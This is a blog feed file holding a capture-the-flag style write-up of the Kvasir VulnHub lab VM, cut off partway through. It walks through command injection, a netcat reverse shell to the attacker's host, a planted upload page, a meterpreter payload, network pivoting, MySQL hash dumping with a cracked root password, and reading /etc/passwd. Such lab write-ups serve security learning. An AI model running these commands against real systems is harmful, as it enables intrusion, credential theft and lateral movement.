@@ -1,0 +1,1772 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Crypto | Knapsy's brain dump]]></title>
+  <link href="http://blog.knapsy.com/blog/categories/crypto/atom.xml" rel="self"/>
+  <link href="http://blog.knapsy.com/"/>
+  <updated>2018-08-05T19:22:49+10:00</updated>
+  <id>http://blog.knapsy.com/</id>
+  <author>
+    <name><![CDATA[Knapsy]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Kvasir VM Writeup]]></title>
+    <link href="http://blog.knapsy.com/blog/2014/11/05/kvasir-vm-writeup/"/>
+    <updated>2014-11-05T19:30:38+11:00</updated>
+    <id>http://blog.knapsy.com/blog/2014/11/05/kvasir-vm-writeup</id>
+    <content type="html"><![CDATA[<p>It sort of became the main theme of this blog&hellip; yet another writeup for a VM from <a href="http://vulnhub.com">VulnHub</a> and, I have to admit, probably the most demanding one yet!</p>
+
+<p><a href="http://vulnhub.com/entry/kvasir-i,106/">Kvasir</a> touches on quite a lot of aspects of security/pentesting and really tests your patience. <a href="https://twitter.com/_RastaMouse">Rasta Mouse</a> did a great job putting it all together and simulating a network of quite some depth by using Linux containers.</p>
+
+<p>So, without delying too much, let&rsquo;s get right into it as there&rsquo;s A LOT to go through!</p>
+
+<!-- more -->
+
+
+<h2>Preface</h2>
+
+<p>Since it&rsquo;s quite lengthy VM, I&rsquo;ll skip describing thousands of failed attempts and other ideas that I had and thought <em>should have</em> worked.</p>
+
+<p>Instead, I will jump straight to the essence, but, in some cases, I&rsquo;ll mention what is also worth trying if you find yourself in similar situations (but didn&rsquo;t work with this challenge).</p>
+
+<h2>Recon</h2>
+
+<p>You know the drill, boot up the VM, wait a little bit for containers to kick-in and use <code>netdiscover</code> to find its IP address.</p>
+
+<pre><code>root@kali:~# netdiscover -r 172.16.246.0/24
+
+ Currently scanning: Finished!   |   Screen View: Unique Hosts                 
+
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 172.16.246.1    00:50:56:c0:00:01    01    060   VMWare, Inc.                 
+ 172.16.246.134  00:0c:29:a8:5e:9e    01    060   VMware, Inc.                 
+ 172.16.246.254  00:50:56:f1:3e:b4    01    060   VMWare, Inc.                 
+</code></pre>
+
+<p>And <code>nmap</code> to find what ports are open.</p>
+
+<pre><code>root@kali:~# nmap -sV 172.16.246.134
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-11-05 19:42 EST
+Nmap scan report for 172.16.246.134
+Host is up (0.00032s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.22 ((Debian))
+MAC Address: 00:0C:29:A8:5E:9E (VMware)
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds
+</code></pre>
+
+<h2>No redirect and command injection</h2>
+
+<p>Let&rsquo;s have a look at that webserver.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/login.png" title="Login" alt="Login" /></p>
+
+<p>We have a simple login form, first thing I usually try is bypassing this with some standard SQL injection <code>' or '1'='1' --</code> in both login and password fields. Unfortunately this didn&rsquo;t work here.</p>
+
+<p>Let&rsquo;s create a new user and see what else can we access.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/welcome.png" title="Welcome" alt="Welcome" /></p>
+
+<p>Hmm, not much of a useful stuff. Generally, you would want to keep an eye on and play with:</p>
+
+<ul>
+<li>cookies</li>
+<li>XXS - not very useful here as there are no users to attack</li>
+<li>SQL injection on any of the input fields / URL parameters</li>
+</ul>
+
+
+<p>But none of the above worked. So let&rsquo;s open up <code>dirbuster</code> and see are there any other pages that we can&rsquo;t access at the moment&hellip;</p>
+
+<pre><code>root@kali:~# dirbuster
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+File found: /index.php - 200
+Dir found: / - 200
+Dir found: /cgi-bin/ - 403
+File found: /login.php - 302
+File found: /register.php - 200
+File found: /submit.php - 200
+File found: /admin.php - 302
+File found: /member.php - 302
+...
+</code></pre>
+
+<p>Straight away <code>admin.php</code> stands out - looks interesting&hellip; and when trying to access it, we get a redirect to member.php! Cool, let&rsquo;s use <code>burp</code> and avoid redirection.</p>
+
+<p>I&rsquo;m using <code>FoxyProxy</code> to ensure my browser is using proxy I specify (in this case, <code>burp</code>). Set it up and type in <code>http://172.16.246.134/admin.php</code> in the address bar.</p>
+
+<p>Go to Proxy -> Intercept and Burp and set it to intercept response.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/intercept_response.png" title="Intercept Response" alt="Intercept Response" /></p>
+
+<p>Forward the request and you&rsquo;ll see the response.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/response.png" title="Response" alt="Response" /></p>
+
+<p>Let&rsquo;s modify the header from <code>HTTP/1.1 302 FOUND</code> to <code>HTTP/1.1 200</code> (bypassing redirection) and forward the packet. Look what we can see in the browser now!</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/service_check.png" title="Service Check" alt="Service Check" /></p>
+
+<p>Awesome! Let&rsquo;s type in what&rsquo;s suggested - apache2 and see what happens. Since we still have <code>burp</code> running, we&rsquo;ll go through the same steps of modifying the request and response as above, otherwise, we&rsquo;ll be redirected back to <code>member.php</code> page.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/apache_running.png" title="Apache Running" alt="Apache Running" /></p>
+
+<p>It&rsquo;s just asking for command injection! But since doing it all through <code>burp</code> would be a bit of a pain, I&rsquo;ve crafted a simple script to do it all for me.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;</span><span class="o">!</span><span class="sr">/usr/</span><span class="n">bin</span><span class="sr">/perl&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="nv">$url</span><span class="o">=&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;http://172.16.246.134/admin.php&quot;</span><span class="o">&gt;</span><span class="n">http:</span><span class="sr">//</span><span class="mf">172.16.246.134</span><span class="sr">/admin.php&lt;/</span><span class="n">a</span><span class="o">&gt;&amp;</span><span class="n">rsquo</span><span class="p">;;</span><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">use</span> <span class="n">LWP</span><span class="p">;</span>
+</span><span class='line'><span class="k">use</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;HTTP::Request::Common;&quot;</span><span class="o">&gt;</span><span class="nn">HTTP::Request::</span><span class="n">Common</span><span class="p">;</span><span class="sr">&lt;/a&gt;</span>
+</span><span class='line'><span class="nv">$ua</span> <span class="o">=</span> <span class="nv">$ua</span> <span class="o">=</span> <span class="nn">LWP::</span><span class="n">UserAgent</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">;;</span>
+</span><span class='line'><span class="nv">$res</span> <span class="o">=</span> <span class="nv">$ua</span><span class="o">-&gt;</span><span class="n">request</span><span class="p">(</span><span class="n">POST</span> <span class="nv">$url</span><span class="p">,</span>
+</span><span class='line'><span class="n">Content_Type</span> <span class="o">=&gt;</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="n">Content</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span><span class='line'><span class="n">service</span> <span class="o">=&gt;</span> <span class="nv">$ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
+</span><span class='line'><span class="n">submit</span> <span class="o">=&gt;</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Submit</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span>
+</span><span class='line'><span class="p">],);</span><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;</span><span class="n">Print</span> <span class="n">response</span><span class="sr">&lt;/h1&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">print</span> <span class="nv">$res</span><span class="o">-&gt;</span><span class="n">as_string</span><span class="p">();</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Now I can pass in whatever I want to send through the <code>admin.php</code> page as a command line argument to the script.</p>
+
+<p>Initially I tried <code>./send_form.pl "apache2; id"</code>, but it didn&rsquo;t work, let&rsquo;s try a variation of it with <code>#</code> at the end.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ./send_form.pl &ldquo;apache2; id #&rdquo;
+</span><span class='line'>HTTP/1.1 302 Found
+</span><span class='line'>Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+</span><span class='line'>Connection: close
+</span><span class='line'>Date: Tue, 04 Nov 2014 19:46:00 GMT
+</span><span class='line'>Pragma: no-cache
+</span><span class='line'>Location: index.php
+</span><span class='line'>Server: Apache/2.2.22 (Debian)
+</span><span class='line'>Vary: Accept-Encoding
+</span><span class='line'>Content-Length: 546
+</span><span class='line'>Content-Type: text/html
+</span><span class='line'>Expires: Thu, 19 Nov 1981 08:52:00 GMT
+</span><span class='line'>Client-Date: Wed, 05 Nov 2014 09:40:50 GMT
+</span><span class='line'>Client-Peer: 172.16.246.134:80
+</span><span class='line'>Client-Response-Num: 1
+</span><span class='line'>Set-Cookie: PHPSESSID=vsur3uar3fopv27r8rtfk5dmd2; path=/
+</span><span class='line'>X-Powered-By: PHP/5.4.4-14+deb7u11&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;html>
+</span><span class='line'>&lt;body>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;div align="center">&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;h1>Service Check&lt;/h1>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;form name="service" method="post" action="">
+</span><span class='line'>&lt;input name="service" id="service" type="text" placeholder="apache2" />&lt;br />&lt;br />
+</span><span class='line'>&lt;input name="submit" id="submit" type="submit" value="Submit" />
+</span><span class='line'>&lt;/form>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;form action="logout.php" method="post">
+</span><span class='line'>&lt;input type="submit" value="Logout" />
+</span><span class='line'>&lt;/form>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;pre>Usage: /etc/init.d/apache2 {start|stop|graceful-stop|restart|reload|force-reload|start-htcacheclean|stop-htcacheclean|status}.
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class='line'>&lt;/pre></span></code></pre></td></tr></table></div></figure></p>
+
+<p>Awesome, confirmed command injection! Conviniently, there&rsquo;s <code>netcat</code> available as well, so let&rsquo;s take advantage of it!</p>
+
+<p>Set up listener locally.</p>
+
+<pre><code>root@kali:~# nc -l -p 31337
+</code></pre>
+
+<p>And use the command injection vulnerability to connect back with a shell.</p>
+
+<pre><code>root@kali:~# ./send_form.pl "apache2; netcat -e /bin/bash 172.16.246.129 31337"
+</code></pre>
+
+<pre><code>root@kali:~# nc -l -p 31337
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+
+<p>Woohoo, we&rsquo;re in!</p>
+
+<h2>MySQL and enabling UDF</h2>
+
+<p>Doing a bit of a recon on the box, we can quickly find out by looking at the <code>submit.php</code> file that there&rsquo;s a MySQL database listening on 192.168.2.200 with credentials <code>webapp:webapp</code>.</p>
+
+<p>Okay, looks like this host is dual-homed! We&rsquo;ll need to jump on 192.168.2.0 subnet (and eventually, further). Also, we have non-TTY shell, so it&rsquo;s a bit of a pain&hellip;</p>
+
+<p>To overcome this, I came up with an idea to use <code>metasploit</code> pivoting capability, SOCKS proxy server and <code>proxychains</code> to connect to MySQL database directly from my host.</p>
+
+<p>First, I need to generate and get metasploit payload on the server, but how? I came up with another idea&hellip; but thinking about it now, there are probably number of other, better and easier methods. Oh well, that&rsquo;s the first one I went ahead with, so I&rsquo;ll stick to it with this writeup.</p>
+
+<p>I&rsquo;ll create a new php upload page and get my files on that server this way!</p>
+
+<pre><code>echo "&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=upload.php method=post enctype=multipart/form-data&gt;&lt;input type=file name=uploadFile&gt;&lt;br&gt;&lt;input type=submit value=Upload File&gt;&lt;/form&gt;" &gt; upload.php
+echo "&lt;?php" &gt;&gt; upload.php
+echo "\$target_dir = \"uploads/\";" &gt;&gt; upload.php
+echo "\$target_dir = \$target_dir . basename( \$_FILES[\"uploadFile\"][\"name\"]);" &gt;&gt; upload.php
+echo "if (move_uploaded_file(\$_FILES[\"uploadFile\"][\"tmp_name\"], \$target_dir)) {" &gt;&gt; upload.php
+echo "echo \"The file \". basename( \$_FILES[\"uploadFile\"][\"name\"]). \" has been uploaded.\";" &gt;&gt; upload.php
+echo "} else {" &gt;&gt; upload.php
+echo "echo \"Sorry, there was an error uploading your file.\";" &gt;&gt; upload.php
+echo "}?&gt;&lt;/body&gt;&lt;/html&gt;" &gt;&gt; upload.php
+</code></pre>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/upload.png" title="Upload" alt="Upload" /></p>
+
+<p>Generate metasploit payload and upload it to the server using newly created page.</p>
+
+<pre><code>msf &gt; use payload/linux/x86/meterpreter/reverse_tcp 
+msf payload(reverse_tcp) &gt; show options
+
+Module options (payload/linux/x86/meterpreter/reverse_tcp):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   DebugOptions  0                no        Debugging options for POSIX meterpreter
+   LHOST                          yes       The listen address
+   LPORT         4444             yes       The listen port
+
+msf payload(reverse_tcp) &gt; set LHOST 172.16.246.129
+LHOST =&gt; 172.16.246.129
+msf payload(reverse_tcp) &gt; generate -t elf -f exploit
+[*] Writing 155 bytes to exploit...
+</code></pre>
+
+<p>Set-up metasploit multi handler and run the exploit.</p>
+
+<pre><code>msf &gt; use exploit/multi/handler 
+msf exploit(handler) &gt; set PAYLOAD linux/x86/meterpreter/reverse_tcp 
+PAYLOAD =&gt; linux/x86/meterpreter/reverse_tcp
+msf exploit(handler) &gt; show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   DebugOptions  0                no        Debugging options for POSIX meterpreter
+   LHOST         172.16.246.129   yes       The listen address
+   LPORT         4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(handler) &gt; exploit -j
+[*] Exploit running as background job.
+
+[*] Started reverse handler on 172.16.246.129:4444 
+[*] Starting the payload handler...
+</code></pre>
+
+<pre><code>root@kali:~# nc -l -p 31337
+ls
+admin.php
+index.php
+login.php
+logout.php
+member.php
+register.php
+submit.php
+upload.php
+uploads
+
+
+cd uploads
+./exploit &amp;
+</code></pre>
+
+<pre><code>msf exploit(handler) &gt; [*] Transmitting intermediate stager for over-sized stage...(100 bytes)
+[*] Sending stage (1138688 bytes) to 172.16.246.134
+[*] Meterpreter session 5 opened (172.16.246.129:4444 -&gt; 172.16.246.134:55877) at 2014-11-05 21:24:03 +1100
+</code></pre>
+
+<p>Woop, woop, we got meterpreter shell! <a href="http://i.imgur.com/hV9YDNn.gif">Meterpreter dance</a></p>
+
+<p>Let&rsquo;s configure a pivot and start socks server in metasploit and configure proxychains.</p>
+
+<pre><code>msf exploit(handler) &gt; route add 192.168.2.0 255.255.255.0 5
+[*] Route added
+msf exploit(handler) &gt; route print
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   192.168.2.0        255.255.255.0      Session 5
+
+msf exploit(handler) &gt; back
+msf &gt; use auxiliary/server/socks
+use auxiliary/server/socks4a    use auxiliary/server/socks_unc
+msf &gt; use auxiliary/server/socks4a 
+msf auxiliary(socks4a) &gt; show options
+
+Module options (auxiliary/server/socks4a):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The address to listen on
+   SRVPORT  1080             yes       The port to listen on.
+
+msf auxiliary(socks4a) &gt; run
+[*] Auxiliary module execution completed
+
+[*] Starting the socks4a proxy server
+[*] Stopping the socks4a proxy server
+msf auxiliary(socks4a) &gt; jobs
+</code></pre>
+
+<p>Make sure to add the following lines in <code>/etc/proxychains.conf</code></p>
+
+<pre><code># MetaSploit
+socks4 127.0.0.1 1080
+</code></pre>
+
+<p>Now we can run any command on our local Kali with <code>proxychains</code> in front of it and it&rsquo;ll talk directly to anything on 192.168.2.0 subnet!</p>
+
+<p>Let&rsquo;s connect to the MySQL server and loot as much as we can.</p>
+
+<pre><code>root@kali:~# proxychains mysql -h 192.168.2.200 -u webapp -p
+ProxyChains-3.1 (http://proxychains.sf.net)
+Enter password: 
+|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.200:3306-&lt;&gt;&lt;&gt;-OK
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 67
+Server version: 5.5.37-0+wheezy1 (Debian)
+
+Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| webapp             |
++--------------------+
+4 rows in set (0.09 sec)
+
+mysql&gt; use mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
++---------------------------+
+| Tables_in_mysql           |
++---------------------------+
+| columns_priv              |
+| db                        |
+| event                     |
+| func                      |
+| general_log               |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| host                      |
+| ndb_binlog_index          |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| servers                   |
+| slow_log                  |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
+| user                      |
++---------------------------+
+24 rows in set (0.01 sec)
+
+mysql&gt; select User, Password from user;
++------------------+-------------------------------------------+
+| User             | Password                                  |
++------------------+-------------------------------------------+
+| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
+| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
+| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
+| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
+| debian-sys-maint | *E0E0871376896664A590151D348CCE9AA800435B |
+| webapp           | *BF7C27E734F86F28A9386E9759D238AFB863BDE3 |
+| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
++------------------+-------------------------------------------+
+7 rows in set (0.01 sec)
+
+mysql&gt; use webapp;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
++------------------+
+| Tables_in_webapp |
++------------------+
+| todo             |
+| users            |
++------------------+
+2 rows in set (0.06 sec)
+
+mysql&gt; select * from todo;
++----------------------------+
+| task                       |
++----------------------------+
+| stop running mysql as root |
++----------------------------+
+1 row in set (0.04 sec)
+</code></pre>
+
+<p>Some useful piece of information. We have database running as root user on the server and we looted root password to the database that we cracked via <a href="https://crackstation.net/">CrackStation</a>.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/crackstation.png" title="Crack Station" alt="CrackStation" /></p>
+
+<p>Let&rsquo;s log-in with <code>root:coolwater</code> and see how we can break out to system shell.</p>
+
+<pre><code>root@kali:~# proxychains mysql -h 192.168.2.200 -u root -p
+ProxyChains-3.1 (http://proxychains.sf.net)
+Enter password: 
+|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.200:3306-&lt;&gt;&lt;&gt;-OK
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 68
+Server version: 5.5.37-0+wheezy1 (Debian)
+
+Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; use webapp
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+</code></pre>
+
+<p>There are couple cool things that we can do:</p>
+
+<ul>
+<li>reading any file on the system</li>
+</ul>
+
+
+<pre><code>mysql&gt; create table pwn(test text);
+Query OK, 0 rows affected (0.04 sec)
+
+mysql&gt; load data infile '/etc/passwd' into table pwn;
+Query OK, 22 rows affected (0.01 sec)
+Records: 22  Deleted: 0  Skipped: 0  Warnings: 0
+
+mysql&gt; select * from pwn;
++-------------------------------------------------------------------------+
+| test                                                                    |
++-------------------------------------------------------------------------+
+| root:x:0:0:root:/root:/bin/bash                                         |
+| daemon:x:1:1:daemon:/usr/sbin:/bin/sh                                   |
+| bin:x:2:2:bin:/bin:/bin/sh                                              |
+| sys:x:3:3:sys:/dev:/bin/sh                                              |
+| sync:x:4:65534:sync:/bin:/bin/sync                                      |
+| games:x:5:60:games:/usr/games:/bin/sh                                   |
+| man:x:6:12:man:/var/cache/man:/bin/sh                                   |
+| lp:x:7:7:lp:/var/spool/lpd:/bin/sh                                      |
+| mail:x:8:8:mail:/var/mail:/bin/sh                                       |
+| news:x:9:9:news:/var/spool/news:/bin/sh                                 |
+| uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh                               |
+| proxy:x:13:13:proxy:/bin:/bin/sh                                        |
+| www-data:x:33:33:www-data:/var/www:/bin/sh                              |
+| backup:x:34:34:backup:/var/backups:/bin/sh                              |
+| list:x:38:38:Mailing List Manager:/var/list:/bin/sh                     |
+| irc:x:39:39:ircd:/var/run/ircd:/bin/sh                                  |
+| gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh |
+| nobody:x:65534:65534:nobody:/nonexistent:/bin/sh                        |
+| libuuid:x:100:101::/var/lib/libuuid:/bin/sh                             |
+| sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin                       |
+| mysql:x:102:103:MySQL Server,,,:/nonexistent:/bin/false                 |
+| ftpuser:x:1000:1000::/dev/null:/etc/                                    |
++-------------------------------------------------------------------------+
+22 rows in set (0.02 sec)
+</code></pre>
+
+<ul>
+<li>create a file on the system (as long as it doesn&rsquo;t exist yet, you can&rsquo;t modify/write to existing files)</li>
+</ul>
+
+
+<pre><code>mysql&gt; insert into pwn(test) values("here is some text");
+Query OK, 1 row affected (0.07 sec)
+
+mysql&gt; select * from pwn into dumpfile '/tmp/pwn';
+Query OK, 0 rows affected (0.10 sec)
+</code></pre>
+
+<p>However, this doesn&rsquo;t give us much, no interesting files to read and I tried creating SSH keys, however, MySQL sets permissions of files it creates to 660, which is not restrictive enough for SSH keys to work.</p>
+
+<p>Last resort - UDF functions! But&hellip; there&rsquo;s a problem, it&rsquo;s not installed! But that&rsquo;s OK, there&rsquo;s a trick to install it ourselves.</p>
+
+<p>Couple things we&rsquo;ll need to do:</p>
+
+<ul>
+<li>define base64 decoding functions (we need to somehow get actual libraries over onto the server)</li>
+</ul>
+
+
+<pre><code>-- base64.sql - MySQL base64 encoding/decoding functions
+-- Copyright (C) 2006 Ian Gulliver
+-- 
+-- This program is free software; you can redistribute it and/or modify
+-- it under the terms of version 2 of the GNU General Public License as
+-- published by the Free Software Foundation.
+-- 
+-- This program is distributed in the hope that it will be useful,
+-- but WITHOUT ANY WARRANTY; without even the implied warranty of
+-- MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+-- GNU General Public License for more details.
+-- 
+-- You should have received a copy of the GNU General Public License
+-- along with this program; if not, write to the Free Software
+-- Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
+
+delimiter |
+
+DROP TABLE IF EXISTS base64_data |
+CREATE TABLE base64_data (c CHAR(1) BINARY, val TINYINT) |
+INSERT INTO base64_data VALUES 
+('A',0), ('B',1), ('C',2), ('D',3), ('E',4), ('F',5), ('G',6), ('H',7), ('I',8), ('J',9),
+('K',10), ('L',11), ('M',12), ('N',13), ('O',14), ('P',15), ('Q',16), ('R',17), ('S',18), ('T',19),
+('U',20), ('V',21), ('W',22), ('X',23), ('Y',24), ('Z',25), ('a',26), ('b',27), ('c',28), ('d',29),
+('e',30), ('f',31), ('g',32), ('h',33), ('i',34), ('j',35), ('k',36), ('l',37), ('m',38), ('n',39),
+('o',40), ('p',41), ('q',42), ('r',43), ('s',44), ('t',45), ('u',46), ('v',47), ('w',48), ('x',49),
+('y',50), ('z',51), ('0',52), ('1',53), ('2',54), ('3',55), ('4',56), ('5',57), ('6',58), ('7',59),
+('8',60), ('9',61), ('+',62), ('/',63), ('=',0) |
+
+
+DROP FUNCTION IF EXISTS BASE64_DECODE |
+CREATE FUNCTION BASE64_DECODE (input BLOB)
+RETURNS BLOB
+CONTAINS SQL
+DETERMINISTIC
+SQL SECURITY INVOKER
+BEGIN
+DECLARE ret BLOB DEFAULT '';
+DECLARE done TINYINT DEFAULT 0;
+
+IF input IS NULL THEN
+RETURN NULL;
+END IF;
+
+each_block:
+WHILE NOT done DO BEGIN
+DECLARE accum_value BIGINT UNSIGNED DEFAULT 0;
+DECLARE in_count TINYINT DEFAULT 0;
+DECLARE out_count TINYINT DEFAULT 3;
+
+each_input_char:
+WHILE in_count &lt; 4 DO BEGIN
+DECLARE first_char CHAR(1);
+
+IF LENGTH(input) = 0 THEN
+RETURN ret;
+END IF;
+
+SET first_char = SUBSTRING(input,1,1);
+SET input = SUBSTRING(input,2);
+
+BEGIN
+DECLARE tempval TINYINT UNSIGNED;
+DECLARE error TINYINT DEFAULT 0;
+DECLARE base64_getval CURSOR FOR SELECT val FROM base64_data WHERE c = first_char;
+DECLARE CONTINUE HANDLER FOR SQLSTATE '02000' SET error = 1;
+
+OPEN base64_getval;
+FETCH base64_getval INTO tempval;
+CLOSE base64_getval;
+
+IF error THEN
+ITERATE each_input_char;
+END IF;
+
+SET accum_value = (accum_value &lt;&lt; 6) + tempval;
+END;
+
+SET in_count = in_count + 1;
+
+IF first_char = '=' THEN
+SET done = 1;
+SET out_count = out_count - 1;
+END IF;
+END; END WHILE;
+
+-- We've now accumulated 24 bits; deaccumulate into bytes
+
+-- We have to work from the left, so use the third byte position and shift left
+WHILE out_count &gt; 0 DO BEGIN
+SET ret = CONCAT(ret,CHAR((accum_value &amp; 0xff0000) &gt;&gt; 16));
+SET out_count = out_count - 1;
+SET accum_value = (accum_value &lt;&lt; 8) &amp; 0xffffff;
+END; END WHILE;
+
+END; END WHILE;
+
+RETURN ret;
+END |
+
+DROP FUNCTION IF EXISTS BASE64_ENCODE |
